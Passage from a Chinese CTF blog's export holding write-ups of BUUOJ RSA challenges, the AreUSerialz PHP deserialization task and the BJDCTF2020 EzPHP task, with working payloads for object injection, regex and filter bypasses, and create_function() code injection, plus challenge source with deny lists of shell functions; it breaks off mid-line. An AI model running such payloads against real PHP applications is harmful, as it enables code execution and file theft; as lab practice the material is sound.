      <link href="2020/10/25/BUUOJ%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E9%A2%98-%E4%B8%80%E8%88%ACRSA/"/>
      <url>2020/10/25/BUUOJ%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E9%A2%98-%E4%B8%80%E8%88%ACRSA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="用到的链接"><a href="#用到的链接" class="headerlink" title="用到的链接"></a>用到的链接</h2><p><a href="http://tool.chacuo.net/cryptrsakeyparse">RSA公钥解析</a><br><a href="https://tool.lu/hexconvert/">进制转换</a><br><a href="http://www.factordb.com/index.php?query=86934482296048119190666062003494800588905656017203025617216654058378322103517">RSA之p、q的提取</a><br><a href="https://blog.csdn.net/weixin_45369385/article/details/109208109">RSA-详解dp泄漏</a></p><h2 id="1-RSA"><a href="#1-RSA" class="headerlink" title="1.RSA"></a>1.RSA</h2><h3 id="1-提取n、e"><a href="#1-提取n、e" class="headerlink" title="1.提取n、e"></a>1.提取n、e</h3><p>flag.enc是加密后的文件，pub.enc是公钥文件。</p><p>附件下载下来以后首先看<code>pub.key</code>文件，打开后发现里面的内容为</p><pre class="line-numbers language-none"><code class="language-none">-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+&#x2F;AvKr1rzQczdAgMBAAE&#x3D;-----END PUBLIC KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="http://tool.chacuo.net/cryptrsakeyparse">RSA公钥解析</a>分解一下得<br><pre class="line-numbers language-none"><code class="language-none">公钥指数及模数信息:key长度：256模数：C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD指数：65537 (0x10001)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><p>模数即为<code>n的值</code>，转换为10进制为<code>86934482296048119190666062003494800588905656017203025617216654058378322103517</code>，<br>指数即为<code>e的值</code>，为<code>65537</code>。</p><h3 id="2-提取p、q"><a href="#2-提取p、q" class="headerlink" title="2.提取p、q"></a>2.提取p、q</h3><p><a href="http://www.factordb.com/index.php?query=86934482296048119190666062003494800588905656017203025617216654058378322103517">RSA之p、q的提取</a><br>通过n提取出p、q的值分别为<br><pre class="line-numbers language-none"><code class="language-none">p&#x3D;285960468890451637935629440372639283459q&#x3D;304008741604601924494328155975272418463<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h3 id="3-脚本解密"><a href="#3-脚本解密" class="headerlink" title="3.脚本解密"></a>3.脚本解密</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> rsae <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>p <span class="token operator">=</span> <span class="token number">285960468890451637935629440372639283459</span>q <span class="token operator">=</span> <span class="token number">304008741604601924494328155975272418463</span>                                            <span class="token comment">#上面分别列出n、p、q的值</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                                                                     <span class="token comment">#计算出欧拉函数的值</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>                                                              <span class="token comment">#逆向求出d的值，需要指数e与欧拉函数值phi</span>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>                                              <span class="token comment">#RSA求解私钥（固定格式）</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.enc"</span><span class="token punctuation">,</span> <span class="token string">"rb+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>f<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span>                                                        <span class="token comment">#rsa解密，需加密后的问件及私钥值。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得flag<code>flag&#123;decrypt_256&#125;</code>。<br><img src="/2020/10/25/BUUOJ%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E9%A2%98-%E4%B8%80%E8%88%ACRSA/1.png" alt></p><h2 id="2-RSA2"><a href="#2-RSA2" class="headerlink" title="2.RSA2"></a>2.RSA2</h2><p>文件内容如下<br><pre class="line-numbers language-M" data-language="M"><code class="language-M">e &#x3D; 65537n &#x3D; 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp &#x3D; 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c &#x3D; 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>众所周知，一般的rsa有n、e、c就能求出明文了，但是仅仅是对于容易进行大素数分解的情况，就是<code>n</code>可以分解为两个大素数的情况下，但是有的n恰恰非常难分解，这就需要大量的时间用来分解n，此时若是引入另外的参数，就能更快速地求解出<code>p、q</code>:<br><pre class="line-numbers language-M" data-language="M"><code class="language-M">dp &#x3D; d % (p - 1)dq &#x3D; d % (q - 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>~还没学到，我的天。~<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token punctuation">,</span> powmode <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span>dp <span class="token operator">=</span> <span class="token number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span>c <span class="token operator">=</span> <span class="token number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token operator">*</span>dp<span class="token operator">%</span>x<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>dp<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>x<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span>p<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        q<span class="token operator">=</span>n<span class="token operator">//</span>p        phin<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        d<span class="token operator">=</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phin<span class="token punctuation">)</span>        m<span class="token operator">=</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m:"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span>        <span class="token comment">#print(hex(m)[2:])</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag:"</span><span class="token punctuation">,</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125;</code><br><a href="https://blog.csdn.net/weixin_45369385/article/details/109208109">RSA-详解dp泄漏</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯-2020-青龙组-AreUSerialz</title>
      <link href="2020/10/25/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/"/>
      <url>2020/10/25/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>PS:真不是我想鸽，是真的还没做出来卡到那里了。。</p><p>老文章了，今天搞的那一题因为身体原因没做完，老文章再看看也能温习一下已经快要遗忘了的知识点。</p></blockquote><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>没参加比赛，明年说不定就要参加了，毕竟报了信息安全，不弄个像样点的资历到时候也不好找工作（不过我想考研）。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op &#x3D; &quot;1&quot;;        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;        $content &#x3D; &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;            $res &#x3D; $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res &#x3D; &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res &#x3D; file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)            $this-&gt;op &#x3D; &quot;1&quot;;        $this-&gt;content &#x3D; &quot;&quot;;        $this-&gt;process();    &#125;&#125;&#x2F;*上面都是类的内容*&#x2F;function is_valid($s) &#123;    for($i &#x3D; 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str &#x3D; (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj &#x3D; unserialize($str);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>太长的代码审计了，但是核心就是利用点，就是<code>read()</code>函数了。<br><pre class="line-numbers language-none"><code class="language-none">private function read() &#123;        $res &#x3D; &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res &#x3D; file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><code>file_get_contents($this-&gt;filename)</code>，我们只需要传入我们需要的/flag，一读就OK了。<br>下面是利用payload制作的php代码<br><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass FileHandler &#123;public $op &#x3D; 2;public $filename &#x3D; &quot;flag.php&quot;;public $content;&#125;$obj &#x3D; new FileHandler();$ser &#x3D; serialize($obj);var_dump($ser);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>这里为什么不用protected的变量类型呢？这里的原因有待探究（可能是127号ascii的值被过滤了？）。<br>但是这种绕过方式值得学习一下</p><blockquote><p>在php7.1+对类属性的检测不严格，所以可以用public来绕过  —来自网络</p></blockquote><p>好没怎么研究特性，这也太知识盲区了。。。</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接看源码的最下面就catch flag了。</p><blockquote><p>另外，今天是99重阳节，希望家里的人都好好的。</p></blockquote><p>~一天一篇，明天绝对不鸽~</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-EzPHP</title>
      <link href="2020/10/24/BJDCTF2020-EzPHP/"/>
      <url>2020/10/24/BJDCTF2020-EzPHP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>有时候会讨厌戴眼镜，因为这样看得太清晰还不如模糊一点，可近视的人总要戴上眼镜看世界的，<code>加油，双非人!</code></p></blockquote><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>首先F12查源码发现提示如下图<br><img src="/2020/10/24/BJDCTF2020-EzPHP/1.png" alt="1.png">，然后<code>base32</code>解码后获得提示<code>1nD3x.php</code>，访问后获得源码如下</p><pre class="line-numbers language-none"><code class="language-none"> &lt;?phphighlight_file(__FILE__);error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;;$shana &#x3D; $_GET[&#39;shana&#39;];$passwd &#x3D; $_GET[&#39;passwd&#39;];$arg &#x3D; &#39;&#39;;$code &#x3D; &#39;&#39;;echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;if($_SERVER) &#123;     if (        preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )        die(&#39;You seem to want to do something bad?&#39;); &#125;if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123;         $file &#x3D; $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125; if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123;     die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-绕过-SERVER-39-QUERY-STRING-39"><a href="#1-绕过-SERVER-39-QUERY-STRING-39" class="headerlink" title="1.绕过$_SERVER[&#39;QUERY_STRING&#39;]"></a>1.绕过<code>$_SERVER[&#39;QUERY_STRING&#39;]</code></h2><p>这个看wp说是这个里面并不会对参数进行url解码，所以可以将<code>payload</code>进行url编码后绕过。</p><h2 id="2-绕过if-preg-match-39-aqua-is-cute-39-GET-39-debu-39-amp-amp-GET-39-debu-39-39-aqua-is-cute-39-类型的preg-match"><a href="#2-绕过if-preg-match-39-aqua-is-cute-39-GET-39-debu-39-amp-amp-GET-39-debu-39-39-aqua-is-cute-39-类型的preg-match" class="headerlink" title="2.绕过if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;)类型的preg_match()"></a>2.绕过<code>if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;)</code>类型的preg_match()</h2><p>在payload后面加上<code>%0a</code>换行符可以绕过，本例中绕过为<code>?debu=auqa_is_cute%0a</code></p><h2 id="3-绕过-REQUEST"><a href="#3-绕过-REQUEST" class="headerlink" title="3.绕过$_REQUEST"></a>3.绕过<code>$_REQUEST</code></h2><p>因为<code>$_REQUEST</code>同时接受GET和POST的数据，并且POST具有更高的优先值(待解)。</p><p>这个只需要用<code>$_GET</code>上传payload的同时，<code>$_POST</code>上传一个数值数据就能绕过了。<a href="https://www.gem-love.com/ctf/770.html">出题人博客</a>。</p><h2 id="4-绕过file-get-contents-file-比较相同"><a href="#4-绕过file-get-contents-file-比较相同" class="headerlink" title="4.绕过file_get_contents($file)比较相同"></a>4.绕过file_get_contents($file)比较相同</h2><pre class="line-numbers language-none"><code class="language-none">if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里一般能使用<code>php://input</code>、<code>data://</code>伪协议来绕过，那这里可以使用<code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></p><h2 id="5-绕过sha1-函数比较"><a href="#5-绕过sha1-函数比较" class="headerlink" title="5.绕过sha1()函数比较"></a>5.绕过sha1()函数比较</h2><p>如果sha1()的参数为数组，就会返回false，那如果比较的双方皆为数组，比较的时候不就相等了吗？</p><h2 id="6-create-function-代码注入"><a href="#6-create-function-代码注入" class="headerlink" title="6.create_function()代码注入"></a>6.create_function()代码注入</h2><p>这个主要参见这位博主的文章<br><img src="/2020/10/24/BJDCTF2020-EzPHP/2.png" alt></p><p>通过这种方法可以执行任意命令。。。</p><h2 id="final-拿下flag"><a href="#final-拿下flag" class="headerlink" title="final/.拿下flag"></a>final/.拿下flag</h2><blockquote><p>pay attention: 这里用<code>hackbar</code>来测试。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">#GET?data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#POSTdebu&#x3D;1&amp;file&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="01-create-function-得flag艰难旅途之一"><a href="#01-create-function-得flag艰难旅途之一" class="headerlink" title="01.create_function()得flag艰难旅途之一"></a>01.create_function()得flag艰难旅途之一</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">#GET?debu&#x3D;auqa_is_cute%0a&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua上面的payload中的create_function()主要执行的函数是&#96;var_dump(get_defined_vars());&#96;其中&#96;get_defined_vars()用来输出所有变量和值！&#96;666。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># GET?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d&#x3D;%31&amp;%70%61%73%73%77%64%5b%5d&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#POSTdebu&#x3D;1&amp;file&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/10/24/BJDCTF2020-EzPHP/3.png" alt><br>得到提示<code>rea1fl4g.php</code></p><h3 id="02-create-function-得flag艰难旅途之二"><a href="#02-create-function-得flag艰难旅途之二" class="headerlink" title="02.create_function()得flag艰难旅途之二"></a>02.create_function()得flag艰难旅途之二</h3><p>最后create_function()函数也可以用以下来绕过<br><pre class="line-numbers language-none"><code class="language-none">require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>中间去翻的内容，取反之前为<br><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><img src="/2020/10/24/BJDCTF2020-EzPHP/4.png" alt></p><pre class="line-numbers language-none"><code class="language-none">PGh0bWw+DQo8aGVhZD4NCjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCjxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+DQo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIG1heGltdW0tc2NhbGU9MSwgdXNlci1zY2FsYWJsZT1ubyI+DQo8dGl0bGU+UmVhbF9GbGFnIEluIEhlcmUhISE8L3RpdGxlPg0KPC9oZWFkPg0KPC9odG1sPg0KPD9waHANCgllY2hvICLlkqbvvIzkvaDlsYXnhLbmib7liLDmiJHkuobvvJ&#x2F;vvIHkuI3ov4fnnIvliLDov5nlj6Xor53kuZ&#x2F;kuI3ku6PooajkvaDlsLHog73mi7&#x2F;liLBmbGFn5ZOm77yBIjsNCgkkZjRrZV9mbGFnID0gIkJKRHsxYW1fYV9mYWtlX2Y0MTExMWcyMzMzM30iOw0KCSRyZWExX2YxMTE0ZyA9ICJmbGFne2Q2ZGM4NGQzLTY5MGUtNDRhYi1iM2UyLWEwMzk0MDk1OWI1ZH0iOw0KCXVuc2V0KCRyZWExX2YxMTE0Zyk7DQo&#x3D;&lt;html&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, maximum-scale&#x3D;1, user-scalable&#x3D;no&quot;&gt;&lt;title&gt;Real_Flag In Here!!!&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;&#x2F;html&gt;&lt;?phpecho &quot;咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！&quot;;$f4ke_flag &#x3D; &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;;$rea1_f1114g &#x3D; 